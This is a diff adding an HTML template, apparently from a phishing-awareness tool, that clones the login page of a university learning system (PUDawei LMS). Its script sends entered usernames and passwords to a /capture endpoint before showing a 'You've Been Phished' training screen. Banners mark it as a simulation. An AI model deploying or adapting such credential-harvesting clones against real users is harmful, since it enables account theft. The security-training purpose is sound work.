@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PUDawei LMS: Log in to the site</title>
+<style>
+* {{ margin: 0; padding: 0; box-sizing: border-box; }}
+body {{
+    font-family: 'Open Sans', 'Segoe UI', Arial, sans-serif;
+    background-color: #e8eaed;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}}
+.edu-banner {{
+    background: #ff3d00;
+    color: #fff;
+    width: 100%;
+    text-align: center;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 700;
+    position: fixed;
+    top: 0;
+    z-index: 999;
+    box-shadow: 0 2px 8px rgba(255,61,0,0.4);
+}}
+.navbar {{
+    background: #3e4551;
+    height: 50px;
+    margin-top: 48px;
+}}
+.container {{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex: 1;
+    padding: 40px 20px;
+}}
+.card {{
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    padding: 0;
+    width: 100%;
+    max-width: 740px;
+    overflow: hidden;
+}}
+.logo-section {{
+    background: #f8f9fa;
+    padding: 40px;
+    text-align: center;
+    border-bottom: 1px solid #dee2e6;
+}}
+.logo {{
+    max-width: 180px;
+    height: auto;
+}}
+.form-section {{
+    padding: 30px 50px 40px;
+}}
+.info-section {{
+    padding: 0 50px 30px;
+    display: flex;
+    justify-content: space-between;
+    gap: 30px;
+}}
+.info-column {{
+    flex: 1;
+}}
+.info-column h3 {{
+    font-size: 14px;
+    color: #495057;
+    margin-bottom: 10px;
+}}
+.info-link {{
+    color: #0f6cbf;
+    font-size: 14px;
+    text-decoration: none;
+    display: block;
+    margin-bottom: 8px;
+}}
+.info-link:hover {{
+    text-decoration: underline;
+}}
+.info-text {{
+    font-size: 14px;
+    color: #495057;
+    line-height: 1.6;
+}}
+.info-icon {{
+    color: #0f6cbf;
+    font-size: 18px;
+    cursor: pointer;
+}}
+.field {{
+    margin-bottom: 16px;
+}}
+.field label {{
+    display: block;
+    margin-bottom: 6px;
+    font-size: 14px;
+    color: #495057;
+}}
+.field input {{
+    width: 100%;
+    padding: 10px 12px;
+    border: 1px solid #ced4da;
+    border-radius: 4px;
+    font-size: 15px;
+    color: #495057;
+    outline: none;
+    transition: border-color 0.2s;
+}}
+.field input:focus {{
+    border-color: #80bdff;
+    box-shadow: 0 0 0 3px rgba(0,123,255,0.1);
+}}
+.field input::placeholder {{
+    color: #adb5bd;
+}}
+.checkbox-row {{
+    margin: 16px 0;
+    font-size: 14px;
+}}
+.checkbox-row input {{
+    margin-right: 8px;
+    width: auto;
+}}
+.checkbox-row label {{
+    color: #495057;
+    cursor: pointer;
+    display: inline;
+}}
+.btn-container {{
+    margin-top: 20px;
+    display: flex;
+    gap: 12px;
+}}
+.btn {{
+    padding: 10px 20px;
+    border-radius: 4px;
+    font-size: 15px;
+    cursor: pointer;
+    border: none;
+    font-weight: 500;
+    transition: all 0.2s;
+}}
+.btn-primary {{
+    background-color: #5cb85c;
+    color: #fff;
+    flex: 1;
+}}
+.btn-primary:hover {{
+    background-color: #4cae4c;
+}}
+.btn-secondary {{
+    background-color: #e0e0e0;
+    color: #333;
+    flex: 1;
+}}
+.btn-secondary:hover {{
+    background-color: #d4d4d4;
+}}
+.warning-footer {{
+    background: #fff3cd;
+    border-top: 1px solid #ffc107;
+    padding: 15px 50px;
+    font-size: 13px;
+    color: #856404;
+}}
+footer {{
+    background: #3e4551;
+    color: #fff;
+    padding: 20px;
+    font-size: 13px;
+    margin-top: auto;
+}}
+.footer-content {{
+    max-width: 1140px;
+    margin: 0 auto;
+}}
+.footer-link {{
+    color: #fff;
+    text-decoration: underline;
+    margin-right: 15px;
+}}
+.footer-link:hover {{
+    text-decoration: none;
+}}
+.hidden {{ display: none; }}
+.awareness-screen {{
+    background: #fff;
+    padding: 40px 50px;
+    text-align: center;
+}}
+.awareness-screen h2 {{ 
+    color: #d9534f; 
+    margin-bottom: 20px;
+    font-size: 24px;
+}}
+.awareness-screen p {{
+    margin: 15px 0;
+    color: #495057;
+    line-height: 1.6;
+}}
+.awareness-screen ul {{
+    text-align: left;
+    margin: 20px auto;
+    max-width: 500px;
+    line-height: 2;
+    color: #495057;
+}}
+.indicator {{
+    background: #fff3cd;
+    border: 1px solid #ffc107;
+    border-radius: 4px;
+    padding: 16px;
+    margin-top: 20px;
+    font-size: 14px;
+    text-align: left;
+}}
+@media (max-width: 768px) {{
+    .info-section {{ flex-direction: column; }}
+    .form-section, .info-section, .warning-footer {{ padding-left: 20px; padding-right: 20px; }}
+}}
+</style>
+</head>
+<body>
+<div class="edu-banner">
+  🎓 EDUCATIONAL PHISHING SIMULATION — CREDENTIALS ARE CAPTURED FOR DEMONSTRATION
+</div>
+
+<div class="navbar"></div>
+
+<div class="container" id="loginContainer">
+    <div class="card">
+        <div class="logo-section">
+            <img src="https://lms.pudawei.edu.mm/pluginfile.php/1/core_admin/logo/0x200/1750146856/viber_image_2025-02-04_20-25-27-832.png" 
+                 alt="PUDawei Logo" class="logo" onerror="this.style.display='none'">
+        </div>
+        <div class="form-section">
+            <form id="simForm" onsubmit="showAwareness(event)">
+                <div class="field">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" placeholder="thuralinthtut@ucsdawei.edu.mm" autocomplete="off" required>
+                </div>
+                <div class="field">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Password" autocomplete="off" required>
+                </div>
+                <div class="checkbox-row">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Remember username</label>
+                </div>
+                <div class="btn-container">
+                    <button type="submit" class="btn btn-primary">Log in</button>
+                    <button type="button" class="btn btn-secondary">Log in as a guest</button>
+                </div>
+            </form>
+        </div>
+        <div class="info-section">
+            <div class="info-column">
+                <h3><a href="#" class="info-link">Forgotten your username or password?</a></h3>
+                <p class="info-text">
+                    Cookies must be enabled in your browser
+                    <span class="info-icon">ⓘ</span>
+                </p>
+            </div>
+            <div class="info-column">
+                <p class="info-text">Some courses may allow guest access</p>
+            </div>
+        </div>
+        <div class="warning-footer">
+            ⚠️ This is a phishing simulation for educational training purposes
+        </div>
+    </div>
+</div>
+
+<div class="container hidden" id="awareness">
+    <div class="card">
+        <div class="awareness-screen">
+            <h2>🛡️ You've Been Phished (Simulated!)</h2>
+            <p>
+                In a real attack, your university credentials would now be compromised.
+                Your entered credentials have been captured for this demonstration.
+            </p>
+            <ul>
+                <li>🔗 Check the URL — does it match lms.pudawei.edu.mm?</li>
+                <li>🔒 Verify HTTPS and the certificate matches the institution</li>
+                <li>📧 Be cautious of unexpected login requests via email</li>
+                <li>🔤 Watch for typos in domain names (pudawel, pudawe1)</li>
+                <li>🎨 Compare branding and logos to the official site</li>
+                <li>🔐 Real LMS platforms have additional security measures</li>
+            </ul>
+            <div class="indicator">
+                <strong>Phishing indicators on this page:</strong><br>
+                {{{indicators}}}
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer>
+    <div class="footer-content">
+        You are not logged in.
+        <a href="#" class="footer-link">Home</a>
+        <a href="#" class="footer-link">Data retention summary</a>
+    </div>
+</footer>
+
+<script>
+function showAwareness(e) {{
+  e.preventDefault();
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  
+  if (username && password) {{
+    fetch('/capture', {{
+      method: 'POST',
+      headers: {{ 'Content-Type': 'application/json' }},
+      body: JSON.stringify({{
+        username: username,
+        password: password,
+        preset: '{{{preset_key}}}'
+      }})
+    }}).catch(err => console.log('Capture endpoint unavailable'));
+  }}
+  
+  document.querySelectorAll('input').forEach(i => i.value = '');
+  document.getElementById('loginContainer').classList.add('hidden');
+  document.getElementById('awareness').classList.remove('hidden');
+}}
+</script>
+</body>
+</html>
